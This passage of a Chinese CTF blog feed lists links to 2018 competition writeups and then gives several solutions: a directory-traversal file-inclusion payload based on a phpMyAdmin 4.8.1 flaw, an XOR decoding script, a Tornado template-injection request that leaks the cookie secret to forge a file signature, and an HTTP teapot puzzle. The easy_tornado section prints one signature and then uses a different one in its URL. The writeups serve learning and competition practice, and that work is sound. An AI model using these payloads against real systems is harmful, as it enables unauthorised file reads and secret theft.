href="#LCTF-2018-Writeup-–-whitzard" class="headerlink" title="LCTF 2018 Writeup – whitzard"></a><a href="https://xz.aliyun.com/t/3338" target="_blank" rel="noopener">LCTF 2018 Writeup – whitzard</a></h3><h3 id="LCTF-2018-Writeup-–-ROIS"><a href="#LCTF-2018-Writeup-–-ROIS" class="headerlink" title="LCTF 2018 Writeup – ROIS"></a><a href="https://xz.aliyun.com/t/3339" target="_blank" rel="noopener">LCTF 2018 Writeup – ROIS</a></h3><p>——2018年11月20日更新</p><hr><h2 id="2018HCTF"><a href="#2018HCTF" class="headerlink" title="2018HCTF"></a><a href="https://hctf.io/#/" target="_blank" rel="noopener">2018HCTF</a></h2><h3 id="官方writeup以及所有源码"><a href="#官方writeup以及所有源码" class="headerlink" title="官方writeup以及所有源码"></a><a href="https://bysec.io/hctf/writeup.html" target="_blank" rel="noopener">官方writeup</a>以及<a href="https://github.com/vidar-team/HCTF2018" target="_blank" rel="noopener">所有源码</a></h3><h3 id="HCTF2018-Writeup-–-Eur3kA"><a href="#HCTF2018-Writeup-–-Eur3kA" class="headerlink" title="HCTF2018 Writeup – Eur3kA"></a><a href="https://xz.aliyun.com/t/3253" target="_blank" rel="noopener">HCTF2018 Writeup – Eur3kA</a></h3><h3 id="HCTF2018-Writeup-–-FlappyPig"><a href="#HCTF2018-Writeup-–-FlappyPig" class="headerlink" title="HCTF2018 Writeup – FlappyPig"></a><a href="https://xz.aliyun.com/t/3245" target="_blank" rel="noopener">HCTF2018 Writeup – FlappyPig</a></h3><h3 id="HCTF2018-Writeup-–-De1ta"><a href="#HCTF2018-Writeup-–-De1ta" class="headerlink" title="HCTF2018 Writeup – De1ta"></a><a href="https://xz.aliyun.com/t/3255" target="_blank" rel="noopener">HCTF2018 Writeup – De1ta</a></h3><h3 id="HCTF-2018-Writeup-–-Whitzard"><a href="#HCTF-2018-Writeup-–-Whitzard" class="headerlink" title="HCTF 2018 Writeup – Whitzard"></a><a href="https://xz.aliyun.com/t/3242" target="_blank" rel="noopener">HCTF 2018 Writeup – Whitzard</a></h3><h3 id="HCTF2018-WEB-详细Write-up"><a href="#HCTF2018-WEB-详细Write-up" class="headerlink" title="HCTF2018-WEB-详细Write up"></a><a href="https://www.anquanke.com/post/id/163974#h2-1" target="_blank" rel="noopener">HCTF2018-WEB-详细Write up</a></h3><h3 id="HCTF-xor-game-amp-the-end详细WP"><a href="#HCTF-xor-game-amp-the-end详细WP" class="headerlink" title="HCTF-xor_game&amp;the_end详细WP"></a><a href="https://www.anquanke.com/post/id/163964" target="_blank" rel="noopener">HCTF-xor_game&amp;the_end详细WP</a></h3><h3 id="用sqlmap解题2018HCTF-Kzone"><a href="#用sqlmap解题2018HCTF-Kzone" class="headerlink" title="用sqlmap解题2018HCTF-Kzone"></a><a href="https://www.anquanke.com/post/id/163958" target="_blank" rel="noopener">用sqlmap解题2018HCTF-Kzone</a></h3><h3 id="从HCTF两道Web题谈谈flask客户端session机制"><a href="#从HCTF两道Web题谈谈flask客户端session机制" class="headerlink" title="从HCTF两道Web题谈谈flask客户端session机制"></a><a href="https://www.anquanke.com/post/id/163975" target="_blank" rel="noopener">从HCTF两道Web题谈谈flask客户端session机制</a></h3><hr><h2 id="2018“骇极杯”"><a href="#2018“骇极杯”" class="headerlink" title="2018“骇极杯”"></a><a href="https://race.ichunqiu.com/dhb" target="_blank" rel="noopener">2018“骇极杯”</a></h2><h3 id="官方writeup"><a href="#官方writeup" class="headerlink" title="[官方writeup]"></a>[官方writeup]</h3><h3 id="2018-上海市大学生网络安全大赛题解"><a href="#2018-上海市大学生网络安全大赛题解" class="headerlink" title="2018 上海市大学生网络安全大赛题解"></a><a href="https://mmmmmmlei.cn/2018/11/05/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" target="_blank" rel="noopener">2018 上海市大学生网络安全大赛题解</a></h3><h3 id="2018-上海市大学生网络安全大赛线上赛-Writeup-by-Whitzard"><a href="#2018-上海市大学生网络安全大赛线上赛-Writeup-by-Whitzard" class="headerlink" title="2018 上海市大学生网络安全大赛线上赛 Writeup by Whitzard"></a><a href="https://xz.aliyun.com/t/3155#toc-5" target="_blank" rel="noopener">2018 上海市大学生网络安全大赛线上赛 Writeup by Whitzard</a></h3><h3 id="第四届上海市大学生网络安全大赛线上初赛-WriteUp"><a href="#第四届上海市大学生网络安全大赛线上初赛-WriteUp" class="headerlink" title="第四届上海市大学生网络安全大赛线上初赛 WriteUp"></a><a href="https://www.tuicool.com/articles/QnuuMrn" target="_blank" rel="noopener">第四届上海市大学生网络安全大赛线上初赛 WriteUp</a></h3><h3 id="第四届上海市大学生网络安全大赛"><a href="#第四届上海市大学生网络安全大赛" class="headerlink" title="第四届上海市大学生网络安全大赛"></a><a href="https://github.com/hacker-mao/ctf_repo/tree/master/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B" target="_blank" rel="noopener">第四届上海市大学生网络安全大赛</a></h3><h3 id="“骇极杯”全国大学生网络安全邀请赛-Write-up"><a href="#“骇极杯”全国大学生网络安全邀请赛-Write-up" class="headerlink" title="“骇极杯”全国大学生网络安全邀请赛 Write up"></a><a href="https://www.smi1e.top/%E9%AA%87%E6%9E%81%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B-write-up/" target="_blank" rel="noopener">“骇极杯”全国大学生网络安全邀请赛 Write up</a></h3><h3 id="第四届上海市大学生网络安全大赛-baby-arm"><a href="#第四届上海市大学生网络安全大赛-baby-arm" class="headerlink" title="[第四届上海市大学生网络安全大赛] baby_arm"></a><a href="http://myhackerworld.top/2018/11/05/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-baby-arm/" target="_blank" rel="noopener">[第四届上海市大学生网络安全大赛] baby_arm</a></h3><h3 id="第四届上海市大学生网络安全赛-WEB-amp-MISC"><a href="#第四届上海市大学生网络安全赛-WEB-amp-MISC" class="headerlink" title="第四届上海市大学生网络安全赛-WEB&amp;MISC"></a><a href="http://altman.vip/2018/11/04/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B-WEB/" target="_blank" rel="noopener">第四届上海市大学生网络安全赛-WEB&amp;MISC</a></h3><h3 id="2018上海大学生信息安全竞赛-Web全题解"><a href="#2018上海大学生信息安全竞赛-Web全题解" class="headerlink" title="2018上海大学生信息安全竞赛-Web全题解"></a><a href="https://xz.aliyun.com/t/3150" target="_blank" rel="noopener">2018上海大学生信息安全竞赛-Web全题解</a></h3><h3 id="第四届上海市大学生网络安全大赛-Web全记录"><a href="#第四届上海市大学生网络安全大赛-Web全记录" class="headerlink" title="第四届上海市大学生网络安全大赛_Web全记录"></a><a href="https://xz.aliyun.com/t/3153" target="_blank" rel="noopener">第四届上海市大学生网络安全大赛_Web全记录</a></h3><hr><h2 id="护网杯（貌似官方不给提供环境了，很多题没法复现）"><a href="#护网杯（貌似官方不给提供环境了，很多题没法复现）" class="headerlink" title="护网杯（貌似官方不给提供环境了，很多题没法复现）"></a>护网杯（貌似官方不给提供环境了，很多题没法复现）</h2><h3 id="2018护网杯-web部分题解"><a href="#2018护网杯-web部分题解" class="headerlink" title="2018护网杯-web部分题解"></a><a href="https://www.anquanke.com/post/id/161849#h2-1" target="_blank" rel="noopener">2018护网杯-web部分题解</a></h3><h3 id="2018护网杯calendar详析"><a href="#2018护网杯calendar详析" class="headerlink" title="2018护网杯calendar详析"></a><a href="https://www.anquanke.com/post/id/162121" target="_blank" rel="noopener">2018护网杯calendar详析</a></h3><h3 id="护网杯-old-Attack题解"><a href="#护网杯-old-Attack题解" class="headerlink" title="护网杯-old Attack题解"></a><a href="https://www.anquanke.com/post/id/163596#h2-1" target="_blank" rel="noopener">护网杯-old Attack题解</a></h3><h3 id="护网杯2018-easy-laravel-writeup与记录"><a href="#护网杯2018-easy-laravel-writeup与记录" class="headerlink" title="护网杯2018 easy_laravel writeup与记录"></a><a href="https://xz.aliyun.com/t/2912" target="_blank" rel="noopener">护网杯2018 easy_laravel writeup与记录</a></h3><h3 id="2018护网杯easy-laravel-getshell"><a href="#2018护网杯easy-laravel-getshell" class="headerlink" title="2018护网杯easy_laravel getshell"></a><a href="https://xz.aliyun.com/t/2901" target="_blank" rel="noopener">2018护网杯easy_laravel getshell</a></h3><h3 id="2018护网杯线上赛-Writeup-by-天枢"><a href="#2018护网杯线上赛-Writeup-by-天枢" class="headerlink" title="2018护网杯线上赛 Writeup by 天枢"></a><a href="https://xz.aliyun.com/t/2897" target="_blank" rel="noopener">2018护网杯线上赛 Writeup by 天枢</a></h3><h3 id="2018护网杯线上赛-Writeup-by-Whitzard"><a href="#2018护网杯线上赛-Writeup-by-Whitzard" class="headerlink" title="2018护网杯线上赛 Writeup by Whitzard"></a><a href="https://xz.aliyun.com/t/2893" target="_blank" rel="noopener">2018护网杯线上赛 Writeup by Whitzard</a></h3><h3 id="2018护网杯线上赛-Writeup-by-Lilac"><a href="#2018护网杯线上赛-Writeup-by-Lilac" class="headerlink" title="2018护网杯线上赛 Writeup by Lilac"></a><a href="https://xz.aliyun.com/t/2892" target="_blank" rel="noopener">2018护网杯线上赛 Writeup by Lilac</a></h3><hr><h2 id="Hackergame-2018（中国科学技术大学第五届信息安全大赛）"><a href="#Hackergame-2018（中国科学技术大学第五届信息安全大赛）" class="headerlink" title="Hackergame 2018（中国科学技术大学第五届信息安全大赛）"></a><a href="https://hack2018.lug.ustc.edu.cn/" target="_blank" rel="noopener">Hackergame 2018（中国科学技术大学第五届信息安全大赛）</a></h2><p>万恶的黑曜石浏览器和咖啡壶协议出自这里。</p><h3 id="官方writeup-1"><a href="#官方writeup-1" class="headerlink" title="官方writeup"></a><a href="https://github.com/ustclug/hackergame2018-writeups" target="_blank" rel="noopener">官方writeup</a></h3><h3 id="中国科学技术大学第五届信息安全大赛-——-USTC-Hackergame-2018-WriteUp"><a href="#中国科学技术大学第五届信息安全大赛-——-USTC-Hackergame-2018-WriteUp" class="headerlink" title="中国科学技术大学第五届信息安全大赛 —— USTC Hackergame 2018 WriteUp"></a><a href="https://impakho.com/post/ustc-hackergame-2018-writeup" target="_blank" rel="noopener">中国科学技术大学第五届信息安全大赛 —— USTC Hackergame 2018 WriteUp</a></h3><p>这位师傅用手机做的很多题，大写的服。</p><hr><h2 id="2018网鼎杯第一场（教育组）"><a href="#2018网鼎杯第一场（教育组）" class="headerlink" title="2018网鼎杯第一场（教育组）"></a><a href="https://race.ichunqiu.com/2018wdb1st" target="_blank" rel="noopener">2018网鼎杯第一场（教育组）</a></h2><h3 id="“网鼎杯”第一场Write-up"><a href="#“网鼎杯”第一场Write-up" class="headerlink" title="“网鼎杯”第一场Write up"></a><a href="https://www.smi1e.top/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BAwrite-up/" target="_blank" rel="noopener">“网鼎杯”第一场Write up</a></h3><h3 id="2018年-网鼎杯CTF-第一场-China-H-L-B-“网鼎杯”-部分WriteUp"><a href="#2018年-网鼎杯CTF-第一场-China-H-L-B-“网鼎杯”-部分WriteUp" class="headerlink" title="2018年 网鼎杯CTF 第一场 China H.L.B “网鼎杯” 部分WriteUp"></a><a href="https://xz.aliyun.com/t/2611" target="_blank" rel="noopener">2018年 网鼎杯CTF 第一场 China H.L.B “网鼎杯” 部分WriteUp</a></h3><h3 id="2018年-网鼎杯CTF-第一场-教育组-Pwn-Babyheap-题解"><a href="#2018年-网鼎杯CTF-第一场-教育组-Pwn-Babyheap-题解" class="headerlink" title="2018年 网鼎杯CTF 第一场 教育组 Pwn Babyheap 题解"></a><a href="https://xz.aliyun.com/t/2609" target="_blank" rel="noopener">2018年 网鼎杯CTF 第一场 教育组 Pwn Babyheap 题解</a></h3><h3 id="2018年-网鼎杯CTF-第一场-教育组-WP-—-Lilac"><a href="#2018年-网鼎杯CTF-第一场-教育组-WP-—-Lilac" class="headerlink" title="2018年 网鼎杯CTF 第一场 教育组 WP — Lilac"></a><a href="https://xz.aliyun.com/t/2608" target="_blank" rel="noopener">2018年 网鼎杯CTF 第一场 教育组 WP — Lilac</a></h3><h3 id="2018年-网鼎杯CTF-第一场-Web-题解"><a href="#2018年-网鼎杯CTF-第一场-Web-题解" class="headerlink" title="2018年 网鼎杯CTF 第一场 Web 题解"></a><a href="https://xz.aliyun.com/t/2607" target="_blank" rel="noopener">2018年 网鼎杯CTF 第一场 Web 题解</a></h3><p>——2018年11月12日更新</p><hr>]]></content>
      
      
      <categories>
          
          <category> 收集writeup </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>2018 HCTF Warmup writeup</title>
      <link href="/2018/11/11/2018hctf/"/>
      <url>/2018/11/11/2018hctf/</url>
      
        <content type="html"><![CDATA[<p>只有做这种签到题才能维持得了生活。<br>进入<a href="http://warmup.2018.hctf.io/" target="_blank" rel="noopener">题目</a>可看到：</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx4euyd67rj311s0vudj1.jpg" alt=""></p><p>点进去 <code>hint</code> 可看到：</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fx4exuo9t2j30ug082t8w.jpg" alt=""></p><p>这个url有个很明显的文件包含，推测是文件包含漏洞。然后试了一下下面两个常用的payload：</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>warmup<span class="token number">.2018</span><span class="token punctuation">.</span>hctf<span class="token punctuation">.</span>io<span class="token regex">/index.php?file=../</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token regex">/../</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token regex">/../</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg<span class="token punctuation">.</span>phphttp<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>warmup<span class="token number">.2018</span><span class="token punctuation">.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>read<span class="token operator">=</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span>index<span class="token punctuation">.</span>php </code></pre><p>。。。并没有出来什么东西。接着在看首页源代码的时候发现有个 <code>source.php</code> 的注释，我们进去看看：</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx4f9ee9woj3118116wg4.jpg" alt=""></p><p>又是艰难的代码审计过程。通过google发现这题是一个<a href="https://www.imuo.com/a/9d619fd76c6a0eca0904d02f06753307d46e2b1dbea245e67840082cc4b157ec" target="_blank" rel="noopener">PhpMyadmin4.81文件包含的CVE</a>，关于此漏洞的解析网上有很多，这里搬运一个：<a href="http://www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">《phpmyadmin-4.8.1-复现分析》</a><br>直接贴payload吧：</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>warmup<span class="token number">.2018</span><span class="token punctuation">.</span>hctf<span class="token punctuation">.</span>io<span class="token regex">/index.php?file=source.php%253f/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token regex">/../</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token regex">/../</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF,writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>“护网杯”部分题writeup</title>
      <link href="/2018/10/15/huwangbei/"/>
      <url>/2018/10/15/huwangbei/</url>
      
        <content type="html"><![CDATA[<h2 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h2><p>描述是“easy xor???”，提示这题需要用异或。<br>下载一个txt文件，打开后里面有一串字符：</p><pre class=" language-javascript"><code class="language-javascript">AAoHAR0nJ1YlUVQnU1BTVCVfUVZRUVUkUCBeUlVWIlBXUiNTXhs<span class="token operator">=</span></code></pre><p>看到后面有“=”号，应该是base64加密。解密后得到异或密文。<br>因为flag格式的最后一个字符为“}”，猜想将密文的最后一个字符与“}”异或就可得到密钥，再用这个密钥异或所有密文就可得到flag。脚本如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> base64str <span class="token operator">=</span> <span class="token string">"AAoHAR0nJ1YlUVQnU1BTVCVfUVZRUVUkUCBeUlVWIlBXUiNTXhs="</span>s <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    #<span class="token number">0x66</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    #fres <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    res <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>i<span class="token operator">^</span><span class="token number">0x66</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p>得到flag{AA0C72A5652C970773B6F8430D614E58}</p><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>进去是这样的：</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6vynhepwj30ji0f83z0.jpg" alt=""><br>点开分别看到如下：</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw6w2ukuoqj307e04ijr6.jpg" alt=""></p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6w36xq08j30ey04amx0.jpg" alt=""></p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6w38vbymj306w03udfm.jpg" alt=""></p><p>第三个flag.txt可以看到有个文件目录，此时的url为：</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">49.4</span><span class="token punctuation">.</span><span class="token number">95.5</span><span class="token punctuation">:</span><span class="token number">31849</span><span class="token operator">/</span>file<span class="token operator">?</span>filename<span class="token operator">=</span>flag<span class="token punctuation">.</span>txt<span class="token operator">&amp;</span>signature<span class="token operator">=</span>bb6d71b58a9d8c4b0e32e99eee055029</code></pre><p>试着包含这个目录看能不能读取flag出来。构造url为：</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">49.4</span><span class="token punctuation">.</span><span class="token number">95.5</span><span class="token punctuation">:</span><span class="token number">31849</span><span class="token operator">/</span>file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>fllllllllllag<span class="token operator">&amp;</span>signature<span class="token operator">=</span>bb6d71b58a9d8c4b0e32e99eee055029</code></pre><p>结果出现这个：</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw6w93kycdj30qu08cq36.jpg" alt=""></p><p>说签名错误，意思是得求出正确的signature来。<br>再看hint.txt给的一个提示：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">md5</span><span class="token punctuation">(</span>cookie_secret <span class="token operator">+</span> <span class="token function">md5</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> </code></pre><p>可能这就是求签名的式子，先求求看。式子中需要用到cookie_secret和filename，filename已经知道是“/fllllllllllag”，那么接下来就需要求cookie_secret。</p><p>我们查看一下tornado这个框架的文档。<br>可以得知tornado框架里的tornado.web组件里有RequestHandler和Application类。<br>找到cookie_secret相关的东西看看。</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xcyd1prj30xq0f4my1.jpg" alt=""></p><p>cookie_secret是self.application.settings的参数。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6xk17fb3j30mu05smx2.jpg" alt=""></p><p>RequestHandler.settings是self.application.settings 的别名。</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xkb0wigj312a05gt8v.jpg" alt=""></p><p>接下来就是来找找如何构造url:</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6wqcurl0j31c60ceq4a.jpg" alt=""></p><p>模板可以用两个大括号来构造表达式。<br>再看看模板的一些用法:</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6wudcktlj30oo0mgjsm.jpg" alt=""></p><p>handler是RequestHandler的对象。<br>于是我们可以构造表达式:</p><pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">{</span><span class="token punctuation">{</span>handler<span class="token punctuation">.</span>settings<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>构造url：</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">49.4</span><span class="token punctuation">.</span><span class="token number">95.5</span><span class="token punctuation">:</span><span class="token number">31849</span><span class="token operator">/</span>error<span class="token operator">?</span>msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler<span class="token punctuation">.</span>settings<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xv3jjppj31gu048mxm.jpg" alt=""></p><p>就可以得到我们的cookie_secret为：</p><pre class=" language-javascript"><code class="language-javascript">I<span class="token punctuation">{</span>k57<span class="token punctuation">.</span>yLAO6<span class="token operator">?</span>sScNFro$<span class="token operator">~</span>l<span class="token operator">!</span>2xX<span class="token operator">-</span>_0n<span class="token operator">&amp;</span>Md@j<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">(</span>GZfqYK<span class="token operator">*</span>JDWCtv4P8mpub1#zEU<span class="token operator">^</span></code></pre><p>现在可以把得到的cookie_secret代入式子求签名了。脚本如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> hashlibcookie <span class="token operator">=</span> <span class="token string">"I{k57.yLAO6?sScNFro$~l!2xX-_0n&amp;Md@j)%(GZfqYK*JDWCtv4P8mpub1#zEU^"</span>filename <span class="token operator">=</span> <span class="token string">"/fllllllllllag"</span>#md5 <span class="token punctuation">(</span>cookie_ secret <span class="token operator">+</span> md5 <span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>temp <span class="token operator">=</span> hashlib<span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>sum <span class="token operator">=</span> cookie <span class="token operator">+</span> tempsign <span class="token operator">=</span> hashlib<span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span>sum<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>sign<span class="token punctuation">)</span></code></pre><p>得到签名为b9a067e37b3d90410b4761bd02c95b6e，构造url：</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">49.4</span><span class="token punctuation">.</span><span class="token number">95.5</span><span class="token punctuation">:</span><span class="token number">31849</span><span class="token operator">/</span>file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>fllllllllllag<span class="token operator">&amp;</span>signature<span class="token operator">=</span>297cf619ef0551768aac7fc0dca97838</code></pre><p>可得到flag{0d2443ae8744ceffa67cf1513b293331} </p>]]></content>
      
      
      <categories>
          
          <category> CTF,writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异或,tornado框架 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hackergame 2018 我是谁writeip</title>
      <link href="/2018/10/12/whoami/"/>
      <url>/2018/10/12/whoami/</url>
      
        <content type="html"><![CDATA[<p>这一题有两关<br>题目描述<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5hr20wcfj30w60ian10.jpg" alt=""><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i3urrpzj30ji0o2q4t.jpg" alt=""><br>随便点击Submit提交点东西，都是显示相同的东西。<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i4bk23yj30mc06edg8.jpg" alt=""><br>应该是提交得不对，还得找出正确的“我”出来。<br>先看看源码，里头只有一个css，并没有其他东西。又到burpsuite里抓包，并没有找出什么线索。。。接着去网上搜索关于“我是谁”的哲学问题，陷入沉思，怀疑人生。接着无意中在火狐的控制台里看到这么个东西。!<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i5mrd87j31ko0byq75.jpg" alt=""><br>I’M A TEAPOT<br>茶壶是什么鬼！！！摸不着头脑，先把TEAPOT给提交了。<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i6pg1i2j30w2098wfk.jpg" alt=""><br>得到flag{i_canN0t_BReW_c0ffEE!}和这一题第二关的链接和描述，意思是帮他泡茶。<br>点进去是这样的页面。<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw5i72cl7bj30js04qweu.jpg" alt=""><br>让我们用其他的方式来请求页面。<br>先用burpsuite抓包。<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw5i7pxjyzj30si0awq5g.jpg" alt=""><br>看到是用GET的方式来请求页面，改成POST试一试<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i80s5stj30sc0co0vk.jpg" alt=""><br>出现了这么两句话</p><pre><code> The method &quot;POST&quot; is deprecated. See RFC-7168 for more information.</code></pre><p>于是我们去找RFC-7168来看看，Google的时候看到维基百科对超文本咖啡壶控制协议的描述（RFC-7168是这个协议的扩展文档）。里面有点内容需要留意。<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw5i8xg5cqj31a80lg7bf.jpg" alt=""><br>可以知道BREW这个HTTP请求能泡茶，先抓包修改请求试试。<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw5ia64twuj30sg0caq5r.jpg" alt=""></p><pre><code>Please check if there is anything missing in your header.</code></pre><p>提示我们请求头部少了点东西。看看RFC-7168文档先。文档很长，但大概内容是教我们怎么“泡茶”。在The “message/teapot” Media Type这一段中我们可以看到这一句：</p><pre><code>The Content-Type header of a POST or BREW request sent to a TEA-capable pot MUST be &quot;message/teapot&quot; if tea is to be requested.</code></pre><p>意思是如果要请求茶，则要发送的BREW或POST请求的Content-Type头必须是“message / teapot”<br>于是我们在包里添上</p><pre><code>Content-Type: message/teapot</code></pre><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw5ib5zoouj30sc0cm774.jpg" alt=""><br>得到了点新东西</p><pre><code>HTTP/1.0 300 MULTIPLE CHOICESAlternates: {&quot;/the_super_great_hidden_url_for_brewing_tea/black_tea&quot; {type message/teapot}}</code></pre><p>继续回到文档找相应的内容（google翻译后）：<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw5icih2buj30l0088dh8.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw5icp36tqj30xg0oc793.jpg" alt=""><br>可以知道我们可以选择black_tea来泡茶，选择的方式就是构造url。于是修改url为</p><pre><code>/the_super_great_hidden_url_for_brewing_tea/black_tea</code></pre><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw5icwhelkj30sa0d4dip.jpg" alt=""><br>就可以得到flag{delivering_tea_to_DaLa0}，真的想给出题dalao递茶，给这脑洞跪了。</p>]]></content>
      
      
      <categories>
          
